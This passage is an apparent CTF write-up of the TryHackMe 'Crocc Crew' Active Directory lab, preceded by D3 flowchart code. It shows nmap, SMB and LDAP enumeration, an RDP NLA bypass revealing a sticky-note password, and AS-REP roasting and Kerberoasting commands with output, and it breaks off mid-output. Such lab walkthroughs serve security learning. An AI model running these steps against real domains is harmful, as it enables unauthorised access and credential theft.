+.node-exploit .flowchart-icon { color: #DC143C; }  
+.node-access .flowchart-icon { color: #2E8B57; }  
+.node-privesc .flowchart-icon { color: #FF8C00; }  
+.node-root .flowchart-icon { color: #FFD700; }  
+.node-default .flowchart-icon { color: #A9A9A9; }  
+</style>
+
+<script>
+(function() {
+  
+  "use strict";
+
+  let flowchartInstances = {};
+
+  const iconMap = {
+    recon: '\uf002', enum: '\uf0ca', exploit: '\uf1e2',
+    access: '\uf084', privesc: '\uf21b', root: '\uf624', default: '\uf059',
+    pin: '\uf08d',
+  };
+
+  function initFlowcharts() {
+    const containers = document.querySelectorAll('.attack-path-flowchart');
+    containers.forEach(container => {
+      if (container.dataset.initialized) return;
+      container.dataset.initialized = 'true';
+
+      const id = container.id;
+      const dataDiv = container.querySelector('.flowchart-data');
+      if (dataDiv) {
+        const steps = parseSteps(dataDiv.textContent);
+        if (steps.length > 0) {
+          flowchartInstances[id] = createInteractiveFlowchart(container, steps);
+          setupControls(container, id);
+        }
+      }
+    });
+  }
+
+  function setupControls(container, id) {
+    const instance = flowchartInstances[id];
+    if (!instance) return;
+    container.querySelectorAll('.zoom-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const action = btn.getAttribute('data-action');
+        if (action === 'zoom-in') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1.2);
+        } else if (action === 'zoom-out') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1 / 1.2);
+        } else if (action === 'reset') {
+          instance.svg.transition().ease(d3.easeCubicOut).duration(750).call(instance.zoom.transform, d3.zoomIdentity);
+        }
+      });
+    });
+  }
+
+  function parseSteps(content) {
+    return content.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      line = line.replace(/^[-*]\s*/, '');
+      const imgRe = /\[\s*([^\]]+?)\s*\]\s*(.*)/;
+      const match = line.match(imgRe);
+      const text = match ? match[2].trim() : line;
+      return { id: idx, text, type: getStepType(text), imageUrl: match ? match[1] : null, pinned: false };
+    });
+  }
+
+  function getStepType(text) {
+    const l = text.toLowerCase();
+    if (l.includes('nmap') || l.includes('scan') || l.includes('recon')) return 'recon';
+    if (l.includes('enum') || l.includes('directory') || l.includes('subdomain') || l.includes('git') || l.includes('dump') || l.includes('crawl')) return 'enum';
+    if (l.includes('exploit') || l.includes('rce') || l.includes('sqli') || l.includes('xss') || l.includes('lfi') || l.includes('upload') || l.includes('injection')) return 'exploit';
+    if (l.includes('shell') || l.includes('reverse') || l.includes('bind') || l.includes('webshell')) return 'access';
+    if (l.includes('privesc') || l.includes('privilege') || l.includes('escalation') || l.includes('sudo') || l.includes('suid') || l.includes('kernel') || l.includes('creds')) return 'privesc';
+    if (l.includes('root') || l.includes('administrator') || l.includes('system') || l.includes('sudo bee')) return 'root';
+    return 'default';
+  }
+
+  function createInteractiveFlowchart(container, nodesData) {
+    const W = container.clientWidth, H = container.clientHeight;
+    const svg = d3.select(container).append('svg')
+                  .attr('class','flowchart-svg').attr('width',W).attr('height',H);
+
+    const zoom = d3.zoom().duration(500).scaleExtent([0.1, 5]).on('zoom', e => g.attr('transform', e.transform));
+
+    svg.call(zoom);
+    const g = svg.append('g');
+
+    const defs = svg.append('defs');
+    defs.append('marker')
+        .attr('id','arrowhead').attr('viewBox','-0 -5 10 10')
+        .attr('refX', 25).attr('refY', 0)
+        .attr('orient','auto').attr('markerWidth', 5).attr('markerHeight', 5)
+      .append('path').attr('d', 'M0,-5L10,0L0,5').attr('class','flowchart-arrow-marker');
+
+    const links = nodesData.length > 1 ? d3.range(nodesData.length - 1).map(i => ({ source: nodesData[i], target: nodesData[i+1] })) : [];
+
+    const arrows = g.append("g").selectAll("line")
+      .data(links).enter().append("line")
+      .attr("class", "flowchart-arrow")
+      .attr("marker-end", "url(#arrowhead)");
+
+    const nodeGroups = g.append("g").selectAll(".flowchart-node")
+      .data(nodesData, d => d.id).enter().append("g")
+      .attr("class", d => 'flowchart-node node-' + d.type);
+
+    nodeGroups.each(function(d) {
+      const node = d3.select(this);
+      if (d.imageUrl) {
+        node.append('image')
+          .attr('href', d.imageUrl).attr('class', 'flowchart-image')
+          .attr('x', -20).attr('y', -25).attr('width', 40).attr('height', 40)
+          .on('error', function() {
+            d3.select(this.parentNode).append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap['default']);
+            d3.select(this).remove();
+          });
+      } else {
+        node.append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap[d.type] || iconMap['default']);
+      }
+    });
+
+    nodeGroups.append('text')
+      .attr('class', 'flowchart-pin-icon')
+      .attr('x', 20)
+      .attr('y', -20)
+      .text(iconMap.pin);
+
+    nodeGroups.append('text').attr('class', 'flowchart-text').attr('y', 35)
+      .each(function(d) { wrapText(d3.select(this), d.text, 100); });
+    nodeGroups.append('title').text(d => d.text);
+
+    const numNodes = nodesData.length;
+    const padding = 120;
+    const nodeRadius = 40;
+
+    const linkForce = d3.forceLink(links).id(d => d.id).distance(150).strength(0.2);
+
+    const simulation = d3.forceSimulation(nodesData)
+        .force("link", linkForce)
+        .force("charge", d3.forceManyBody().strength(-600))
+        .force("collide", d3.forceCollide().radius(nodeRadius).strength(1))
+        .force("x", d3.forceX(d => {
+            if (numNodes <= 1) return W / 2;
+            return padding + (d.id / (numNodes - 1)) * (W - 2 * padding);
+        }).strength(0.4))
+        .force("y", d3.forceY(d => {
+            if (numNodes <= 1) return H / 2;
+            const amplitude = H * 0.20;
+            const frequency = Math.PI;
+            const centerY = H / 2;
+            const phase = (d.id / (numNodes - 1)) * frequency;
+            return centerY - amplitude * Math.cos(phase);
+        }).strength(0.5))
+        .on("tick", () => {
+          arrows
+              .attr("x1", d => d.source.x)
+              .attr("y1", d => d.source.y)
+              .attr("x2", d => d.target.x)
+              .attr("y2", d => d.target.y);
+          nodeGroups
+              .attr("transform", d => `translate(${d.x},${d.y})`);
+        });
+
+    const dragHandler = d3.drag()
+        .on("start", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0.3).restart();
+            d.fx = d.x;
+            d.fy = d.y;
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', true);
+            linkForce.strength(0); 
+        })
+        .on("drag", function (event, d) {
+            d.fx = event.x;
+            d.fy = event.y;
+        })
+        .on("end", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0);
+            
+            linkForce.strength(0.2); 
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', false);
+
+            d.pinned = true;
+            d3.select(this).select('.flowchart-pin-icon').style('display', 'block');
+        });
+
+    nodeGroups
+      .call(dragHandler)
+      .on('mouseover', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', true);
+      })
+      .on('mouseout', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', false);
+      })
+      .on('contextmenu', function(event, d) {
+        event.preventDefault();
+        
+        if (d.pinned) {
+          d.pinned = false;
+          d.fx = null; 
+          d.fy = null;
+          d3.select(this).select('.flowchart-pin-icon').style('display', 'none');
+          simulation.alpha(0.3).restart(); 
+        }
+      });
+
+    return { svg, zoom, g };
+  }
+
+  function wrapText(textElem, str, maxW) {
+    const words = str.split(/\s+/), lineHeight = 12, x = 0;
+    textElem.text(null);
+    let line = [], tspan = textElem.append('tspan').attr('x', x);
+    for (const word of words) {
+        line.push(word);
+        tspan.text(line.join(' '));
+        if (tspan.node().getComputedTextLength() > maxW && line.length > 1) {
+            line.pop();
+            tspan.text(line.join(' '));
+            line = [word];
+            tspan = textElem.append('tspan').attr('x', x).attr('dy', `${lineHeight}px`).text(word);
+        }
+    }
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initFlowcharts);
+  } else {
+    initFlowcharts();
+  }
+})();
+</script>
+
+<h1 id="1-initial-access-ta0001">1. Initial Access (TA0001)<a hidden class="anchor" aria-hidden="true" href="#1-initial-access-ta0001">#</a></h1>
+<p>As always, the first step is a thorough <code>nmap</code> scan to see what we&rsquo;re working with.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/crocccew.nmap <span class="flag">-vv</span> 10.10.208.147
+# Nmap 7.95 scan initiated Tue Jul  8 22:57:20 2025 as: /usr/lib/nmap/nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/crocccew <span class="flag">-vv</span> 10.10.208.147
+Nmap scan report for 10.10.232.56
+Host is up, received echo-reply ttl 125 (0.12s latency).
+Scanned at 2025-07-08 22:57:20 EDT for 66s
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
+80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-09 02:57:35Z)
+135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 125
+464/tcp  open  kpasswd5?     syn-ack ttl 125
+593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack ttl 125
+3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
+| Issuer: commonName=DC.COOCTUS.CORP
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-07-08T02:57:02
+| Not valid after:  2026-01-07T02:57:02
+| MD5:   78dc:192b:b5b8:8825:8fc8:694a:0347:7704
+| SHA-1: a413:afa5:27c4:a5bf:4418:f49c:cf20:b0b6:e312:7561
+| <span class="flag">-----BEGIN</span> CERTIFICATE-----
+| MIIC4jCCAcqgAwIBAgIQUedVsKPVb7FAziU1B3KpMzANBgkqhkiG9w0BAQsFADAa
+| MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjUwNzA4MDI1NzAyWhcNMjYw
+| MTA3MDI1NzAyWjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG
+| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCwriWZOi4e7FNBmyqXt4U3dZwT4AtJ0Nd7
+| 4kBUyj6W9nolkMit/WmQfY5fdPm8hYYD7v9EuENfOaIUDuJ+58EBqHqVa1MEvKtK
+| N72oHiVGmIXfHpSFgkSbwktt1oye5J7SDPtlLqr+21RaTpvQE67VZnb78tqvflhy
+| eks7EieAsQ10CK2SRR1JDclJUns5ibJv6htsP6D0rmJ4sF+VLCdXIh2A7QvHk3qD
+| cWsIBUlUgct2wmxrPpiClt9lU0YnIUqL0MOGSt+TyK7JfNLEtdwD/PEuKYriY8Kf
+| x1KDfB9ZYZ7sv+u22csEcLu/337TrE5XRiwPM4xqo6DvEOZPgDe5AgMBAAGjJDAi
+| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
+| AAOCAQEANW4kPq2xALqBFsfbqAoeCph6qIwwpRr78Iy700Nx4m0UgLrHSFrZ9M2Q
+| KnMQfregVusen0Zkk9QdgNn/nTKgNqO/lQNrUpL2RE6jadnSrMEucXAaTY9m3ph7
+| Ty5TwPWgX6EAlSfnFO1FQoVM+sNWEF68akQeGSUESsHW0DWmaNrbdTYd+sy2/CZr
+| EfVEVQMMNhHWVR4rHEvRf/B5P2VERAMdRTtgUUe6Ysw0r0osZ1fa+mfU+rPO0wjv
+| mfTwL7PKicvIvA4Ljlh9h6FizzWMIvr5lRK3Dxm66hHuyduQCfI/+vsn+KejlKLy
+| fM6uyRPAZQ8pf7KWGiddXmlm/7X5gw==
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: COOCTUS
+|   NetBIOS_Domain_Name: COOCTUS
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: COOCTUS.CORP
+|   DNS_Computer_Name: DC.COOCTUS.CORP
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-07-09T02:57:43+00:00
+|_ssl-date: 2025-07-09T02:58:22+00:00; <span class="flag">-2s</span> from scanner time.
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 65000/tcp): CLEAN (Timeout)
+|   Check 2 (port 48223/tcp): CLEAN (Timeout)
+|   Check 3 (port 18913/udp): CLEAN (Timeout)
+|   Check 4 (port 21237/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: <span class="flag">-1s</span>, deviation: 0s, median: <span class="flag">-1s</span>
+| smb2-time: 
+|   date: 2025-07-09T02:57:46
+|_  start_date: N/A
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jul  8 22:58:26 2025 <span class="flag">--</span> 1 IP address (1 host up) scanned in 65.91 seconds
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The scan results clearly point to a Windows Domain Controller for the <code>COOCTUS.CORP</code> domain. We have all the standard AD ports (Kerberos, LDAP, SMB) plus RDP on port 3389. I added the relevant hostnames to my <code>/etc/hosts</code> file to ensure proper name resolution.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">'10.10.208.147 dc dc.cooctus.corp cooctus.corp'</span> | <span style="color: #15adff">sudo</span> tee <span class="flag">-a</span> /etc/hosts
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<hr>
+<h3 id="anonymous-enumeration-t1087">Anonymous Enumeration (T1087)<a hidden class="anchor" aria-hidden="true" href="#anonymous-enumeration-t1087">#</a></h3>
+<p>Without any credentials, I started with some unauthenticated enumeration to see what I could find. First, an anonymous SMB login to check for readable shares.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target <span class="flag">-u</span> <span class="string">''</span> <span class="flag">-p</span> <span class="string">''</span> <span class="flag">--shares</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="indicator-success">[+]</span> COOCTUS.CORP\: 
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="indicator-error">[-]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>I could authenticate as an anonymous user, but didn&rsquo;t have permissions to list the shares. Next, I tried an anonymous LDAP bind to see if I could dump any information about the domain structure.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-s</span> base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=COOCTUS,DC=CORP
+namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP
+namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
+namingcontexts: DC=DomainDnsZones,DC=COOCTUS,DC=CORP
+namingcontexts: DC=ForestDnsZones,DC=COOCTUS,DC=CORP
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-b</span> <span class="string">'DC=COOCTUS,DC=CORP'</span>
+# extended LDIF
+#
+# LDAPv3
+# base <DC=COOCTUS,DC=CORP> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The query returned the naming contexts, but a deeper query to dump objects failed, as it required an authenticated session.</p>
+<p>Tools like <code>ldapdomaindump</code> also reveals nothing.
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapdomaindump</span> ldap://cooctus.corp
+<span class="indicator-info">[*]</span> Connecting as anonymous user, dumping will probably fail. Consider specifying a username/password to login with
+<span class="indicator-info">[*]</span> Connecting to host...
+<span class="indicator-info">[*]</span> Binding to host
+<span class="indicator-success">[+]</span> Bind OK
+<span class="indicator-info">[*]</span> Starting domain dump
+<span class="indicator-success">[+]</span> Domain dump finished
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Since RDP was open, I decided to see if I could connect without credentials. My initial attempt failed due to Network Level Authentication (<code>NLA</code>), which requires authentication <em>before</em> the login screen is shown.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">xfreerdp3</span> /v:$target /u:'' /p:''
+[18:14:47:738] [186515:0002d894] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x08 -> no RDP scancode found
+[18:14:47:738] [186515:0002d894] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x5D -> no RDP scancode found
+[18:14:48:348] [186515:0002d894] [WARN][com.freerdp.crypto] - [verify_cb]: Certificate verification failure <span class="string">'self-signed certificate (18)'</span> at stack position 0
+[18:14:48:348] [186515:0002d894] [WARN][com.freerdp.crypto] - [verify_cb]: CN = DC.COOCTUS.CORP
+Domain:          
+[18:14:49:710] [186515:0002d894] [INFO][com.freerdp.core.nla] - [nla_client_setup_identity]: No credentials provided - using NULL identity
+[18:14:49:710] [186515:0002d894] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_cc_get_principal (No credentials cache found (filename: /tmp/krb5cc_1000) [-1765328189])
+[18:14:49:710] [186515:0002d894] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_cc_get_principal (No credentials cache found (filename: /tmp/krb5cc_1000) [-1765328189])
+[18:14:49:963] [186515:0002d894] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
+[18:14:49:964] [186515:0002d894] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x55cf1d61ed60]: CONNECTION_STATE_NLA - nla_recv_pdu() fail
+[18:14:49:964] [186515:0002d894] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x55cf1d61ed60]: CONNECTION_STATE_NLA status STATE_RUN_FAILED [-1]
+[18:14:49:964] [186515:0002d894] [ERROR][com.freerdp.core.transport] - [transport_check_fds]: transport_check_fds: transport->ReceiveCallback() - STATE_RUN_FAILED [-1]
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>However, we can bypass the NLA check and force the server to render the GUI login screen by disabling it on the client side.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">xfreerdp</span> /v:10.10.208.147 /sec:nla:off +f
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>This command opens a fullscreen RDP session, and right there on the login screen was a sticky note with a clue.</p>
+<img src="/img/croccCrew/rdp.png" alt="" class="img-responsive" loading="lazy" />
+<p>The note says <code>Visitor:GuestLogin!</code>. This looks like a username and password. I validated these credentials with <code>netexec</code> and successfully listed the SMB shares.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target <span class="flag">-u</span> visitor <span class="flag">-p</span> <span class="string">'GuestLogin!'</span> <span class="flag">--shares</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="indicator-success">[+]</span> COOCTUS.CORP\visitor:GuestLogin! 
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="indicator-info">[*]</span> Enumerated shares
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="row-header">Share           Permissions     Remark</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span class="flag">-----</span>           <span class="flag">-----------</span>     <span class="flag">------</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span style="color: orange; font-weight: bold">ADMIN$                          Remote Admin</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span style="color: orange; font-weight: bold">C$                              Default share</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span style="color: orange; font-weight: bold">Home            READ            </span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span style="color: orange; font-weight: bold">IPC$            READ            Remote IPC</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span style="color: orange; font-weight: bold">NETLOGON        READ            Logon server share</span>
+<span class="smb">SMB</span>         10.10.208.147   445    DC               <span style="color: orange; font-weight: bold">SYSVOL          READ            Logon server share</span> 
+
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>There was a non-default <code>Home</code> share. I connected with <code>smbclient.py</code> and found the first flag.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">smbclient.py</span> <span class="string">'cooctus.corp/visitor:GuestLogin!'</span>@$target
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Home
+# ls
+drw-rw-rw-          0  Tue Jun  8 15:42:53 2021 .
+drw-rw-rw-          0  Tue Jun  8 15:42:53 2021 ..
+<span class="flag">-rw-rw-rw-</span>         17  Tue Jun  8 15:41:45 2021 user.txt
+# cat user.txt
+
+THM{Gu3st_Pl3as3}
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+THM{Gu3st_Pl3as3}
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<hr>
+<h1 id="2-privilege-escalation-ta0004">2. Privilege Escalation (TA0004)<a hidden class="anchor" aria-hidden="true" href="#2-privilege-escalation-ta0004">#</a></h1>
+<h3 id="kerberoasting-t1558003">Kerberoasting (T1558.003)<a hidden class="anchor" aria-hidden="true" href="#kerberoasting-t1558003">#</a></h3>
+<p>With valid, low-privilege credentials, the next logical step is to check for common AD vulnerabilities. I checked for AS-REP roastable users first:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> ldap $target <span class="flag">-u</span> visitor <span class="flag">-p</span> <span class="string">'GuestLogin!'</span> <span class="flag">--asreproast</span> asreproast.txt
+LDAP        10.10.208.147   389    DC               <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 (name:DC) (domain:COOCTUS.CORP)
+LDAP        10.10.208.147   389    DC               <span class="indicator-success">[+]</span> COOCTUS.CORP\visitor:GuestLogin! 
+LDAP        10.10.208.147   389    DC               <span style="color:orange; font-weight: bold">No entries found!</span>
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>But found none. Then I checked for kerberoastable accounts.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> ldap $target <span class="flag">-u</span> visitor <span class="flag">-p</span> <span class="string">'GuestLogin!'</span> <span class="flag">--kerberoasting</span> kereberoastable.txt
+LDAP        10.10.208.147   389    DC               <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 (name:DC) (domain:COOCTUS.CORP)
+LDAP        10.10.208.147   389    DC               <span class="indicator-success">[+]</span> COOCTUS.CORP\visitor:GuestLogin! 
+LDAP        10.10.208.147   389    DC               <span class="indicator-info">[*]</span> Skipping disabled account: krbtgt
+LDAP        10.10.208.147   389    DC               <span class="indicator-info">[*]</span> Total of records returned 1
+LDAP        10.10.208.147   389    DC               <span class="indicator-info">[*]</span> sAMAccountName: password-reset, memberOf: [], pwdLastSet: 2021-06-08 18:00:39.356663, lastLogon: 2025-07-09 17:43:52.329581
